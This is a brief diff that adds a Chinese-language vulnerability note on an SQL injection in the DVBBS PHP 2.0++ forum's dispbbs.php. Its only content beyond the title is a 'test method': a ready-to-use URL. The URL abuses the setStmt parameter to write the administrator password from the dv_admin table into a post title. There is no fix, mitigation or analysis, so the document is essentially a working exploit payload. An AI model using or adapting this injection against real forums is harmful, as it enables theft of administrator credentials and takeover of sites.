@@ -1,0 +1,6 @@
+动网论坛 (DVBBS) PHP 2.0++ dispbbs.php sql注入漏洞
+
+测试方法:
+
+
+http://ssvdb.com/dispbbs.php?boardid=2&id=1&page=1&setStmt=,title=(select%20password%20from%20dv_admin)
